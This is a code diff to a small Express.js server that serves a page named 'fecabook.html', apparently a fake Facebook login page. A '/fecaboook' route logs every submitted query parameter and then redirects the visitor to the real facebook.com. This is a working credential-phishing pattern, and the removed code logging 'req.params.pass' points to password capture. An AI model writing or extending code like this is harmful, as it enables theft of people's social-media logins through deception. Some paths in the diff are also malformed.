@@ -1,3 +1,4 @@
+const { query } = require('express');
 const express = require('express');
 const app = express();
 
@@ -17,36 +18,34 @@ server.listen(5000,function(){
 });
 */
 
-app.get('/faceboooooook', (req, res,next) => {
+
+app.get('/', (req, res, next) => {
+    console.log('Login fecabook');
+    res.sendFile(__dirname + '/fecabook.html')
+});
+
+app.get('/fecaboook', (req, res, next) => {
+    console.log('redirect to facebook');
+    console.log(JSON.stringify(req.query))
+    res.redirect('http://www.facebook.com');
+});
+
+app.get('/faceboooooook', (req, res, next) => {
     console.log('opening client page');
     res.sendFile(__dirname + '/faceboooooook.html')
 });
 
-app.get('/faceboook', (req, res,next) => {
-    console.log('redirect to facebook');
-    res.redirect('http://www.facebook.com');
-});
-
-
-app.get('/', (req, res,next) => {
-    console.log('Login client page');
-    console.log('==\t==\t==\t');
-    console.log('req.params.pass : ' +req.params.pass);
-    console.log('==\t==\t==\t');
-    res.sendFile(__dirname + '/fecabook.html')
-    });
-
-app.get('/client', (req, res,next) => {
+app.get('/client', (req, res, next) => {
     console.log('opening client page');
     res.sendFile(__dirname + '/client.html')
 });
 
-app.get('/map_me', (req, res,next) => {
+app.get('/map_me', (req, res, next) => {
     console.log('opening map_me page');
     res.sendFile(__dirname + './map_me.html')
 });
 
-app.get('/map_all', (req, res,next) => {
+app.get('/map_all', (req, res, next) => {
     console.log('opening map_all page');
     res.sendFile(__dirname + '//map_all.html')
 });
